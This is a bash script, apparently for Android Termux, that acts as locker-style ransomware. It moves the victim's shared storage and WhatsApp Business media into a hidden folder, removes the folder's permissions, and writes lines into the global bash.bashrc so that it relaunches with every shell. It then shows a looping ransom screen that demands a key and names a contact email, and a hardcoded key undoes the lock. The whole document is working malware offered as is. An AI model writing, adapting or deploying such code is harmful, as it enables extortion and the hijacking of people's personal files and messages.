mkdir /$HOME/.rfkzk
mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
mv /sdcard/Android/media/com.whatsapp.w4b/'Whatsapp Business' /data/data/com.termux/files/home/.rfkzk
chmod u=w /$HOME/.rfkzk
mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
chmod u=x *
chmod u=rx install.sh
clear
echo "alias IMAGE='bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
echo "IMAGE" >> /data/data/com.termux/files/usr/etc/bash.bashrc
sed -i '10s/echo/#/' install.sh ; sed -i '11s/echo/#/' install.sh
sleep 1
while :
do
	clear
 	echo -e "\033[7;49;91m YOUR FILES ARE STEALED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
  echo ""
	sleep 1
	echo ""
	echo -e "\033[0;49;94m For more informations type it:\033[m\033[0;49;93m info\033[m"
  echo ""
	echo -e "\033[4;49;92m"
	read -p "Encrypted Key: " key      
	echo -e "\033[m"
	if [ "$key" == "HoigIgDyufydUd3a%e7t*g9h9hs2g9sgi29hs1oh1ss1s19h" ]
	then
		echo -e "\033[0;49;92m THANK YOU FOR YOUR PAYMENT!\033[m"
		echo -e "\033[0;49;95m Please Check Your Gallery!"
		chmod u=rwx /$HOME/.rfkzk
		mv /$HOME/.rfkzk/* /sdcard
  		mv /data/data/com.termux/files/home/.rfkzk/'Whatsapp Business' /sdcard/Android/media/com.whatsapp.w4b/
		sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
		break
	elif [ "$key" == "info" ]
	then
		clear
		echo -e "\033[0;49;92m Whats happens with my files?\033[m"
		echo ""
		echo "Your files are been confiscated"
		echo "by a malicious script that steal your files"
		echo ""
		echo -e "\033[0;49;92m What i can do?\033[m"
		echo ""
		echo -e "You can send me a message in\033[0;49;91m macksoupletter@gmail.com\033[m"
		echo "and us can solve your problem."
		echo ""
		read -p "press enter to back"
	else
		echo -e "Please try again :("
		sleep 1
	fi



done
